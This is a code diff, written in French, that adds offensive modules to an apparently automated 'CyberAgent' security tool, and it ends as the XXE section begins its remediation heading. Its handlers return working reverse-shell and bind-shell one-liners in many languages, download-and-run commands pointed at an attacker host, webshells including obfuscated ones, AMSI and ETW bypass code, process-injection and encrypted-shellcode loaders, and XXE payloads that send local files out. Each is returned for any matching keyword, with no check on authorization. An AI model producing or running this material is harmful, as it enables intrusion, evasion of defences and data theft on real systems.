@@ -145,6 +145,50 @@ _TRIGGER_MAP = {
         "rate limiting", "brute force protection", "captcha",
         "oauth", "openid", "saml", "sso vulnérabilité",
     ],
+    # ── Nouveaux domaines ───────────────────────────────────────────────────────
+    "reverse_shell": [
+        "reverse shell", "revshell", "shell inversé", "shell inverse",
+        "générer shell", "créer shell", "créer reverse shell", "webshell", "web shell",
+        "bash reverse", "nc -e", "netcat shell", "shell python",
+        "shell php", "shell powershell", "shell ruby", "shell perl",
+        "bind shell", "one liner shell", "shell golang",
+    ],
+    "av_bypass": [
+        "av bypass", "edr bypass", "amsi bypass", "antivirus bypass",
+        "contourner av", "contourner edr", "contourner amsi",
+        "obfuscation payload", "shellcode chiffré", "shellcode obfusqué",
+        "syswhispers", "hell's gate", "unhooking ntdll",
+        "process hollowing", "reflective dll", "process injection av",
+        "xor payload", "rc4 payload", "encrypt shellcode", "bypass defender",
+    ],
+    "xxe": [
+        "xxe", "xml external entity", "entité externe xml",
+        "dtd injection", "attaque xxe", "xml injection externe",
+    ],
+    "deserialize": [
+        "désérialisation", "deserialization", "ysoserial",
+        "pickle exploit", "php unserialize", "java deserialization",
+        "python pickle exploit", "object injection", "gadget chain deserialization",
+        "java gadget", "net deserialization", "php object injection",
+    ],
+    "privesc": [
+        "privilege escalation", "privesc", "élévation de privilèges",
+        "linpeas", "winpeas", "suid bit", "suid exploit",
+        "sudo -l exploit", "getcap linux", "capabilities linux",
+        "writable cron", "always install elevated", "token impersonation",
+        "juicy potato", "printspoofer", "sweet potato", "rogue potato",
+        "local privilege escalation", "lpe linux", "lpe windows",
+    ],
+    "session_hijack": [
+        "session hijacking", "détournement de session", "vol de session",
+        "cookie stealing", "vol de cookie", "session fixation",
+        "csrf attack", "attaque csrf", "forged request",
+        "token replay", "manipuler token session", "steal session",
+    ],
+    "cvss_calc": [
+        "calculer cvss", "cvss calculator", "score cvss v3", "score cvss v4",
+        "calculer score vulnérabilité", "cvss base score", "cvss scoring",
+    ],
 }
 
 _ALL_KEYWORDS: dict[str, list[str]] = {}
@@ -343,6 +387,45 @@ class CyberAgent(BaseAgent):
                         "remédiation", "plan de remédiation", "fiche vulnérabilité",
                         "rapport pentest", "structure rapport"}
 
+    # ── Priorités nouveaux domaines ───────────────────────────────────────────
+    _REVSHELL_PRIORITY = {
+        "reverse shell", "revshell", "shell inversé", "bind shell", "webshell",
+        "web shell", "générer shell", "créer shell", "créer reverse shell",
+        "one liner shell", "bash reverse", "shell python", "shell php",
+        "shell powershell", "shell ruby", "shell perl", "shell golang", "nc -e",
+    }
+    _AVBYPASS_PRIORITY = {
+        "av bypass", "edr bypass", "amsi bypass", "antivirus bypass",
+        "contourner av", "contourner edr", "contourner amsi",
+        "obfuscation payload", "syswhispers", "hell's gate",
+        "unhooking ntdll", "process hollowing", "reflective dll",
+        "xor payload", "rc4 payload", "encrypt shellcode", "bypass defender",
+    }
+    _XXE_PRIORITY = {
+        "xxe", "xml external entity", "entité externe xml",
+        "dtd injection", "attaque xxe",
+    }
+    _DESERIALIZE_PRIORITY = {
+        "désérialisation", "deserialization", "ysoserial",
+        "pickle exploit", "php unserialize", "java deserialization",
+        "python pickle exploit", "object injection", "gadget chain",
+    }
+    _PRIVESC_PRIORITY = {
+        "linpeas", "winpeas", "privilege escalation", "privesc",
+        "élévation de privilèges", "juicy potato", "printspoofer",
+        "suid bit", "suid exploit", "token impersonation", "sweet potato",
+        "always install elevated", "local privilege escalation",
+    }
+    _SESSION_PRIORITY = {
+        "session hijacking", "détournement de session", "cookie stealing",
+        "vol de cookie", "session fixation", "csrf attack", "attaque csrf",
+        "forged request", "token replay", "manipuler token session",
+    }
+    _CVSS_PRIORITY = {
+        "calculer cvss", "cvss calculator", "score cvss v3", "score cvss v4",
+        "calculer score vulnérabilité", "cvss base score", "cvss scoring",
+    }
+
     async def run(self, task: str, context: Optional[dict] = None) -> dict:
         t = task.lower().strip()
 
@@ -356,6 +439,22 @@ class CyberAgent(BaseAgent):
             return self._handle_dev_secure(task)
         if any(kw in t for kw in self._REPORT_PRIORITY):
             return self._handle_report(task)
+
+        # 0c. Nouveaux domaines prioritaires
+        if any(kw in t for kw in self._REVSHELL_PRIORITY):
+            return self._handle_reverse_shell(task)
+        if any(kw in t for kw in self._AVBYPASS_PRIORITY):
+            return self._handle_av_bypass(task)
+        if any(kw in t for kw in self._XXE_PRIORITY):
+            return self._handle_xxe(task)
+        if any(kw in t for kw in self._DESERIALIZE_PRIORITY):
+            return self._handle_deserialize(task)
+        if any(kw in t for kw in self._PRIVESC_PRIORITY):
+            return self._handle_privesc(task)
+        if any(kw in t for kw in self._SESSION_PRIORITY):
+            return self._handle_session_hijack(task)
+        if any(kw in t for kw in self._CVSS_PRIORITY):
+            return self._handle_cvss(task)
 
         # 0b. Niveaux offensifs explicites
         level_result = self._dispatch_level(task, t)
@@ -403,6 +502,20 @@ class CyberAgent(BaseAgent):
             return self._handle_os_admin(task)
         elif category == "dev_secure":
             return self._handle_dev_secure(task)
+        elif category == "reverse_shell":
+            return self._handle_reverse_shell(task)
+        elif category == "av_bypass":
+            return self._handle_av_bypass(task)
+        elif category == "xxe":
+            return self._handle_xxe(task)
+        elif category == "deserialize":
+            return self._handle_deserialize(task)
+        elif category == "privesc":
+            return self._handle_privesc(task)
+        elif category == "session_hijack":
+            return self._handle_session_hijack(task)
+        elif category == "cvss_calc":
+            return self._handle_cvss(task)
 
         # 4. Catalogue
         if any(kw in t for kw in ["liste", "list", "catalogue", "quels outils", "what tools", "available"]):
@@ -2839,6 +2952,833 @@ class CyberAgent(BaseAgent):
             "  supply chain      → dependency confusion, secrets\n\n"
             "Précise la vulnérabilité ou le contexte pour un guide détaillé.",
             {"domain": "dev_secure"})
+
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 10 — REVERSE SHELLS (multi-langages)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_reverse_shell(self, task: str) -> dict:
+        t = task.lower()
+        lhost = self._extract_ip(task) or "10.10.10.10"
+        lport = self._extract_port(task) or "4444"
+
+        listener_nc = f"nc -lvnp {lport}"
+        listener_msf = (
+            f"msfconsole -q -x 'use exploit/multi/handler; "
+            f"set payload linux/x64/shell_reverse_tcp; "
+            f"set LHOST {lhost}; set LPORT {lport}; run'"
+        )
+        upgrade_tty = (
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+            "# Ctrl+Z → stty raw -echo; fg → export TERM=xterm"
+        )
+
+        if any(kw in t for kw in ["python", "py", "python3"]):
+            output = (
+                f"🐚 REVERSE SHELL — Python3  [{lhost}:{lport}]\n\n"
+                f"─ socket + pty (stable) ─\n"
+                f"python3 -c 'import os,pty,socket;"
+                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
+                f"[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'\n\n"
+                f"─ subprocess ─\n"
+                f"python3 -c 'import socket,subprocess,os;"
+                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
+                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+                f"subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
+                f"─ fichier revshell.py ─\n"
+                f"import socket,os,pty\n"
+                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+                f"s.connect((\"{lhost}\",{lport}))\n"
+                f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n"
+                f"pty.spawn(\"/bin/bash\")\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "python", "lhost": lhost, "lport": lport})
+
+        if "bash" in t:
+            output = (
+                f"🐚 REVERSE SHELL — Bash  [{lhost}:{lport}]\n\n"
+                f"─ /dev/tcp ─\n"
+                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
+                f"─ exec ─\n"
+                f"exec bash -i &>/dev/tcp/{lhost}/{lport} <&1\n\n"
+                f"─ encodé base64 (bypass WAF) ─\n"
+                f"echo YmFzaCAtaSA+JiAvZGV2L3RjcC97bGhvc3R9L3tsb3J0fSAwPiYx | base64 -d | bash\n"
+                f"  (remplace {{lhost}}={lhost} et {{lport}}={lport} dans la string puis encode)\n\n"
+                f"─ curl + bash (si accès web) ─\n"
+                f"curl http://{lhost}/rev.sh | bash\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "bash", "lhost": lhost, "lport": lport})
+
+        if "php" in t:
+            output = (
+                f"🐚 REVERSE SHELL — PHP  [{lhost}:{lport}]\n\n"
+                f"─ proc_open (stable) ─\n"
+                f"<?php $s=fsockopen(\"{lhost}\",{lport});"
+                f"$p=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);?>\n\n"
+                f"─ exec ─\n"
+                f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>\n\n"
+                f"─ webshell → revshell ─\n"
+                f"<?php system($_GET['cmd']);?>\n"
+                f"# Puis : curl 'http://victim/sh.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261\"'\n\n"
+                f"─ one-liner cli ─\n"
+                f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "php", "lhost": lhost, "lport": lport})
+
+        if any(kw in t for kw in ["powershell", "ps", "windows", "win"]):
+            import base64 as _b64
+            ps_code = (
+                f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
+                f"$stream = $client.GetStream();"
+                f"[byte[]]$bytes = 0..65535|%{{0}};"
+                f"while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
+                f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
+                f"$sb=(iex $data 2>&1|Out-String);"
+                f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
+                f"$sb3=([text.encoding]::ASCII).GetBytes($sb2);"
+                f"$stream.Write($sb3,0,$sb3.Length);$stream.Flush()}};$client.Close()"
+            )
+            enc = _b64.b64encode(ps_code.encode("utf-16-le")).decode()
+            output = (
+                f"🐚 REVERSE SHELL — PowerShell  [{lhost}:{lport}]\n\n"
+                f"─ classique ─\n"
+                f"powershell -nop -c \"{ps_code}\"\n\n"
+                f"─ encodé base64 (bypass ScriptBlock logging) ─\n"
+                f"powershell -nop -enc {enc}\n\n"
+                f"─ IEX download (si accès web) ─\n"
+                f"powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient)"
+                f".DownloadString('http://{lhost}/rev.ps1')\"\n\n"
+                f"─ cmd.exe → PS ─\n"
+                f"cmd /c powershell -nop -w hidden -enc {enc}\n\n"
+                f"LISTENER MSF :\n"
+                f"msfconsole -q -x 'use exploit/multi/handler; "
+                f"set payload windows/x64/meterpreter/reverse_tcp; "
+                f"set LHOST {lhost}; set LPORT {lport}; run'"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "powershell", "lhost": lhost, "lport": lport})
+
+        if "ruby" in t:
+            output = (
+                f"🐚 REVERSE SHELL — Ruby  [{lhost}:{lport}]\n\n"
+                f"ruby -rsocket -e 'exit if fork;"
+                f"c=TCPSocket.new(\"{lhost}\",{lport});"
+                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "ruby", "lhost": lhost, "lport": lport})
+
+        if "perl" in t:
+            output = (
+                f"🐚 REVERSE SHELL — Perl  [{lhost}:{lport}]\n\n"
+                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
+                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "perl", "lhost": lhost, "lport": lport})
+
+        if any(kw in t for kw in ["golang", "go"]):
+            output = (
+                f"🐚 REVERSE SHELL — Golang  [{lhost}:{lport}]\n\n"
+                f'package main\nimport ("net";"os";"os/exec")\n'
+                f'func main() {{\n'
+                f'  c, _ := net.Dial("tcp", "{lhost}:{lport}")\n'
+                f'  cmd := exec.Command("/bin/bash")\n'
+                f'  cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c\n'
+                f'  cmd.Run()\n}}\n\n'
+                f"go build -o rev rev.go && ./rev\n\n"
+                f"LISTENER : {listener_nc}\n"
+                f"UPGRADE  : {upgrade_tty}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "golang", "lhost": lhost, "lport": lport})
+
+        if any(kw in t for kw in ["nc", "netcat"]):
+            output = (
+                f"🐚 REVERSE SHELL — Netcat  [{lhost}:{lport}]\n\n"
+                f"─ nc avec -e (GNU netcat) ─\n"
+                f"nc -e /bin/bash {lhost} {lport}\n\n"
+                f"─ nc sans -e (mkfifo) ─\n"
+                f"rm /tmp/f 2>/dev/null; mkfifo /tmp/f; "
+                f"cat /tmp/f | /bin/bash -i 2>&1 | nc {lhost} {lport} > /tmp/f\n\n"
+                f"─ ncat ─\n"
+                f"ncat {lhost} {lport} -e /bin/bash\n\n"
+                f"─ busybox nc ─\n"
+                f"busybox nc {lhost} {lport} -e /bin/sh\n\n"
+                f"LISTENER : {listener_nc}"
+            )
+            return self._result(True, output, {"type": "revshell", "lang": "netcat", "lhost": lhost, "lport": lport})
+
+        if any(kw in t for kw in ["webshell", "web shell"]):
+            output = (
+                f"🐚 WEBSHELLS  [pivot vers {lhost}:{lport}]\n\n"
+                f"─ PHP minimaliste ─\n"
+                f"<?php system($_GET['cmd']);?>\n\n"
+                f"─ PHP POST (moins visible dans les logs) ─\n"
+                f"<?php if(isset($_POST['c'])){{system($_POST['c']);}}?>\n\n"
+                f"─ PHP obfusqué ─\n"
+                f"<?php @eval(base64_decode($_POST['x']));?>\n\n"
+                f"─ ASPX ─\n"
+                f"<%@ Page Language=\"C#\" %>\n"
+                f"<%@ Import Namespace=\"System.Diagnostics\" %>\n"
+                f"<% var proc = new Process{{StartInfo={{FileName=\"cmd.exe\","
+                f"Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,"
+                f"RedirectStandardOutput=true}}}}; proc.Start();\n"
+                f"Response.Write(proc.StandardOutput.ReadToEnd()); %>\n\n"
+                f"─ JSP ─\n"
+                f"<%Runtime rt=Runtime.getRuntime();\n"
+                f"String[] c={{\"bash\",\"-c\",request.getParameter(\"cmd\")}};\n"
+                f"Process p=rt.exec(c);\n"
+                f"out.println(new String(p.getInputStream().readAllBytes()));%>\n\n"
+                f"─ Upgrade webshell → reverse shell ─\n"
+                f"curl 'http://victim/sh.php?cmd=bash+-c+"
+                f"\"bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261\"'"
+            )
+            return self._result(True, output, {"type": "webshell", "lhost": lhost, "lport": lport})
+
+        if any(kw in t for kw in ["bind shell", "bind"]):
+            output = (
+                f"🔗 BIND SHELL  [port {lport} sur la cible]\n\n"
+                f"─ nc ─\n"
+                f"nc -lvnp {lport} -e /bin/bash\n\n"
+                f"─ nc mkfifo ─\n"
+                f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp {lport} > /tmp/f\n\n"
+                f"─ python3 ─\n"
+                f"python3 -c 'import socket,os,pty;"
+                f"s=socket.socket();s.bind((\"\",{lport}));s.listen(1);"
+                f"c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];"
+                f"pty.spawn(\"/bin/bash\")'\n\n"
+                f"─ msfvenom bind payload ─\n"
+                f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind_shell\n\n"
+                f"CONNEXION DEPUIS L'ATTAQUANT : nc {'{TARGET_IP}'} {lport}"
+            )
+            return self._result(True, output, {"type": "bindshell", "lport": lport})
+
+        # Défaut : menu complet
+        output = (
+            f"🐚 REVERSE SHELLS — Menu complet  [{lhost}:{lport}]\n\n"
+            f"BASH :\n"
+            f"  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
+            f"PYTHON3 :\n"
+            f"  python3 -c 'import os,pty,socket;s=socket.socket();"
+            f"s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];"
+            f"pty.spawn(\"/bin/bash\")'\n\n"
+            f"PHP :\n"
+            f"  php -r '$s=fsockopen(\"{lhost}\",{lport});"
+            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
+            f"NETCAT :\n"
+            f"  nc -e /bin/bash {lhost} {lport}\n"
+            f"  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f\n\n"
+            f"RUBY :\n"
+            f"  ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});"
+            f"while(cmd=c.gets);IO.popen(cmd){{|io|c.print io.read}};end'\n\n"
+            f"PERL :\n"
+            f"  perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
+            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n\n"
+            f"LISTENER : nc -lvnp {lport}\n\n"
+            f"UPGRADE TTY :\n"
+            f"  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
+            f"  Ctrl+Z → stty raw -echo; fg → export TERM=xterm\n\n"
+            f"Précise : bash / python / php / powershell / ruby / perl / golang / nc / webshell / bind"
+        )
+        return self._result(True, output, {"type": "revshell_menu", "lhost": lhost, "lport": lport})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 11 — AV / AMSI / EDR BYPASS
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_av_bypass(self, task: str) -> dict:
+        t = task.lower()
+
+        if any(kw in t for kw in ["amsi", "amsi bypass"]):
+            return self._result(True,
+                "🛡️  AMSI BYPASS — PowerShell\n\n"
+                "MÉTHODE 1 — Patch mémoire AmsiScanBuffer (le plus fiable) :\n"
+                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
+                ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n"
+                "MÉTHODE 2 — Patch via P/Invoke :\n"
+                "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
+                "$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static');"
+                "$c=$b.GetValue($null);"
+                "[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41424344)\n\n"
+                "MÉTHODE 3 — Patch binaire amsi.dll :\n"
+                "# Trouver AmsiScanBuffer dans amsi.dll\n"
+                "# Remplacer les premiers bytes par : 0xB8 0x57 0x00 0x07 0x80 0xC3\n"
+                "# (retourne E_INVALIDARG — scan non effectué)\n\n"
+                "MÉTHODE 4 — Reflection + obfuscation (bypass signature-based AV) :\n"
+                "$a='System.Management.Automation.A'+'msiUtils';\n"
+                "$b=[Ref].Assembly.GetType($a);\n"
+                "$c=$b.GetField('amsiInitFailed','NonPublic,Static');\n"
+                "$c.SetValue($null,$true)\n\n"
+                "MÉTHODE 5 — ETW disable (pour logging) :\n"
+                "[Reflection.Assembly]::LoadWithPartialName('System.Core');"
+                "$a=[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation');"
+                "$b=$a.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');"
+                "$c=$b.GetField('etwProvider','NonPublic,Static');\n"
+                "[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($c.GetValue($null)),0)\n\n"
+                "NOTE : Tester avec :\n"
+                "  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)",
+                {"domain": "av_bypass", "technique": "amsi"})
+
+        if any(kw in t for kw in ["process hollowing", "process injection", "reflective dll"]):
+            return self._result(True,
+                "🛡️  PROCESS INJECTION / HOLLOWING\n\n"
+                "PROCESS HOLLOWING (CreateProcess + suspend + unmap + inject) :\n"
+                "  1. CreateProcess(target, SUSPENDED)         → PID\n"
+                "  2. ReadProcessMemory → récupérer entrypoint\n"
+                "  3. NtUnmapViewOfSection → désallouer image légitime\n"
+                "  4. VirtualAllocEx(pid, shellcode_size, RWX)\n"
+                "  5. WriteProcessMemory → injecter payload\n"
+                "  6. SetThreadContext(Rcx = new_entrypoint)\n"
+                "  7. ResumeThread\n\n"
+                "CLASSIC INJECTION (CreateRemoteThread) :\n"
+                "  HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
+                "  LPVOID buf = VirtualAllocEx(h, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
+                "  WriteProcessMemory(h, buf, shellcode, shellcode_len, NULL);\n"
+                "  CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);\n\n"
+                "REFLECTIVE DLL INJECTION (Stephen Fewer) :\n"
+                "  - DLL avec ReflectiveDLLInjection export\n"
+                "  - Charge la DLL en mémoire sans LoadLibrary\n"
+                "  - Contourne les hooks user-mode sur CreateRemoteThread\n"
+                "  - Implémentation : github.com/stephenfewer/ReflectiveDLLInjection\n\n"
+                "APC INJECTION :\n"
+                "  OpenProcess → VirtualAllocEx → WriteProcessMemory\n"
+                "  OpenThread(THREAD_SET_CONTEXT) → QueueUserAPC(shellcode_addr)\n"
+                "  ResumeThread → APC s'exécute quand le thread est alertable\n\n"
+                "DIRECT SYSCALLS (Hell's Gate / Syswhispers) :\n"
+                "  - Bypass hooks NTDLL user-mode (EDR/AV)\n"
+                "  - Appel direct SSN (System Service Number) via assembleur inline\n"
+                "  - Syswhispers3 : génère stubs asm pour NtAllocateVirtualMemory, etc.\n"
+                "  - Hell's Gate : lit dynamiquement les SSN depuis ntdll.dll en mémoire",
+                {"domain": "av_bypass", "technique": "injection"})
+
+        if any(kw in t for kw in ["xor payload", "rc4 payload", "encrypt shellcode", "obfusqu"]):
+            return self._result(True,
+                "🛡️  OBFUSCATION & CHIFFREMENT DE SHELLCODE\n\n"
+                "XOR ENCODER (Python) :\n"
+                "key = 0x41\n"
+                "shellcode = b'\\x48\\x31\\xc0...'\n"
+                "encoded = bytes([b ^ key for b in shellcode])\n"
+                "# Décodeur C intégré dans le loader :\n"
+                "for(int i=0;i<len;i++) buf[i] ^= 0x41;\n\n"
+                "RC4 ENCODER (Python) :\n"
+                "from Crypto.Cipher import ARC4\n"
+                "key = b'MySecretKey'\n"
+                "cipher = ARC4.new(key)\n"
+                "encoded = cipher.encrypt(shellcode)\n\n"
+                "AES-256-CBC (Python) :\n"
+                "from Crypto.Cipher import AES\n"
+                "from Crypto.Random import get_random_bytes\n"
+                "key = get_random_bytes(32); iv = get_random_bytes(16)\n"
+                "cipher = AES.new(key, AES.MODE_CBC, iv)\n"
+                "encoded = cipher.encrypt(shellcode + b'\\x00' * (16 - len(shellcode) % 16))\n\n"
+                "LOADER C (decrypte + exec en mémoire) :\n"
+                "unsigned char buf[] = {...}; // shellcode chiffré\n"
+                "HANDLE heap = HeapAlloc(GetProcessHeap(), 0, sizeof(buf));\n"
+                "memcpy(heap, buf, sizeof(buf));\n"
+                "// XOR decode\n"
+                "for(int i=0; i<sizeof(buf); i++) ((char*)heap)[i] ^= 0x41;\n"
+                "HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)heap, NULL, 0, NULL);\n"
+                "WaitForSingleObject(t, INFINITE);\n\n"
+                "OUTILS :\n"
+                "  msfvenom --encoder x86/shikata_ga_nai -i 3\n"
+                "  Donut — shellcode depuis PE/NET : github.com/TheWover/donut\n"
+                "  Freeze — signed loader avec stomping : github.com/optiv/Freeze\n"
+                "  Scarecrow — EDR bypass loader : github.com/optiv/ScareCrow",
+                {"domain": "av_bypass", "technique": "obfuscation"})
+
+        if any(kw in t for kw in ["syswhispers", "hell's gate", "unhooking", "direct syscall"]):
+            return self._result(True,
+                "🛡️  DIRECT SYSCALLS & UNHOOKING NTDLL\n\n"
+                "POURQUOI :\n"
+                "  Les EDR hookent les fonctions NTDLL en user-mode (NtAllocateVirtualMemory,\n"
+                "  NtCreateThreadEx, NtWriteVirtualMemory) pour intercepter les appels.\n"
+                "  Les direct syscalls contournent ces hooks en appelant directement le kernel.\n\n"
+                "SYSWHISPERS3 (génération de stubs) :\n"
+                "  python3 syswhispers.py --preset all -o syscalls\n"
+                "  # Génère syscalls.h + syscalls.asm\n"
+                "  # Inclure dans le projet C/C++ + assembler avec MASM\n\n"
+                "HELL'S GATE (lecture dynamique SSN depuis ntdll.dll) :\n"
+                "  1. Charger ntdll.dll en mémoire (GetModuleHandle)\n"
+                "  2. Parser l'EAT (Export Address Table)\n"
+                "  3. Pour chaque fonction Nt*, lire les bytes au début :\n"
+                "     si mov eax, SSN → extraire SSN\n"
+                "     si hooked (jmp) → lire SSN depuis le stub ou l'EAT de la copy non-hookée\n"
+                "  4. Appeler via inline asm : mov eax, SSN; syscall\n\n"
+                "UNHOOKING NTDLL (restaurer les bytes originaux) :\n"
+                "  1. Ouvrir ntdll.dll frais depuis le disque (CreateFile + MapViewOfFile)\n"
+                "  2. Localiser la section .text dans la version propre\n"
+                "  3. VirtualProtect(ntdll_base + .text_offset, RWX)\n"
+                "  4. Copier la section .text propre sur l'actuelle\n"
+                "  5. Restaurer les permissions d'origine (RX)\n\n"
+                "IMPLÉMENTATIONS :\n"
+                "  Syswhispers3 : github.com/klezVirus/SysWhispers3\n"
+                "  Hell's Gate : github.com/am0nsec/HellsGate\n"
+                "  Tartarus Gate (VEH hooks) : github.com/trickster0/TartarusGate",
+                {"domain": "av_bypass", "technique": "syscalls"})
+
+        return self._result(True,
+            "🛡️  AV / AMSI / EDR BYPASS — Techniques disponibles\n\n"
+            "  amsi bypass          → patcher AMSI en mémoire (PowerShell)\n"
+            "  process hollowing    → injection via CreateProcess suspended\n"
+            "  process injection    → CreateRemoteThread / APC injection\n"
+            "  reflective dll       → DLL injection sans LoadLibrary\n"
+            "  xor payload          → encoder shellcode en XOR/RC4/AES\n"
+            "  obfusquer payload    → encodage + chiffrement loader\n"
+            "  syswhispers          → direct syscalls (Syswhispers3)\n"
+            "  hell's gate          → SSN dynamique depuis ntdll\n"
+            "  unhooking ntdll      → restaurer bytes originaux NTDLL\n"
+            "  bypass defender      → techniques AV evasion Windows\n\n"
+            "Précise la technique pour le code complet.",
+            {"domain": "av_bypass"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 12 — XXE (XML External Entity)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_xxe(self, task: str) -> dict:
+        attacker_ip = self._extract_ip(task) or "10.10.10.10"
+        return self._result(True,
+            "💣 XXE — XML External Entity Injection\n\n"
+            "PAYLOADS DE BASE :\n\n"
+            "─ Lecture fichier local ─\n"
+            "<?xml version=\"1.0\"?>\n"
+            "<!DOCTYPE root [\n"
+            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+            "]>\n"
+            "<root>&xxe;</root>\n\n"
+            "─ Lecture Windows ─\n"
+            "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n\n"
+            "─ SSRF vers service interne ─\n"
+            "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n"
+            "<!ENTITY xxe SYSTEM \"http://localhost:6379/\">\n\n"
+            "BLIND XXE (Out-Of-Band via DNS/HTTP) :\n\n"
+            "─ Payload principal (injecté dans la requête) ─\n"
+            "<!DOCTYPE foo [\n"
+            f"  <!ENTITY % xxe SYSTEM \"http://{attacker_ip}/evil.dtd\">\n"
+            "  %xxe;\n"
+            "]>\n\n"
+            f"─ evil.dtd sur {attacker_ip} ─\n"
+            "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
+            "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM "
+            f"'http://{attacker_ip}/?x=%file;'>\">\n"
+            "%eval;\n"
+            "%exfil;\n\n"
+            f"# Serveur pour catcher : python3 -m http.server 80\n"
+            f"# ou : nc -lvnp 80\n\n"
+            "XXE VIA DOCX/XLSX/SVG/PDF :\n"
+            "  DOCX/XLSX : ces formats ZIP contiennent des XMLs\n"
+            "    unzip target.docx -d docx_folder\n"
+            "    # Injecter XXE dans docx_folder/word/document.xml\n"
+            "    zip -r modified.docx docx_folder\n\n"
+            "  SVG (upload d'image) :\n"
+            "    <?xml version=\"1.0\"?>\n"
+            "    <!DOCTYPE svg [\n"
+            "      <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+            "    ]>\n"
+            "    <svg xmlns='http://www.w3.org/2000/svg'><text>&xxe;</text></svg>\n\n"
+            "DÉTECTION :\n"
+            "  Burp Collaborator / Interactsh pour OOB callbacks\n"
+            "  Chercher : parseurs XML, upload XML/DOCX, SOAP, SVG, PDF\n\n"
+            "REMÉDIATION :\n"
